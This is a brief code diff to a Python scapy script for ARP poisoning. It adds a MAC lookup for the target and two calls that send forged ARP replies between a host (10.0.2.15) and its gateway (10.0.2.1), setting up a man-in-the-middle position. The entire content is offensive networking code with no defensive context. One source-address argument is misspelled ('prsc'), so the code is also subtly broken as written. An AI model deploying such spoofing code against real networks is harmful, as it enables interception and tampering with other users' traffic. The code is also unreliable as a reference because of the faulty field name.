@@ -17,8 +17,11 @@ def get_mac_address(ip_range):
 
 ## Spoofing Target IP Address and MAC Address with the Router
 def arp_poisoning(target_ip, poisoned_ip):
-    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst="08:00:27:bb:99:ed",prsc=poisoned_ip)
+    target_mac =  get_mac_address(target_ip)
+    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,prsc=poisoned_ip)
     scapy.send(arp_response)
     # scapy.ls(scapy.ARP())
 
-get_mac_address("10.0.0.1")
+arp_poisoning("10.0.2.15","10.0.2.1")
+arp_poisoning("10.0.2.1","10.0.2.15")
+
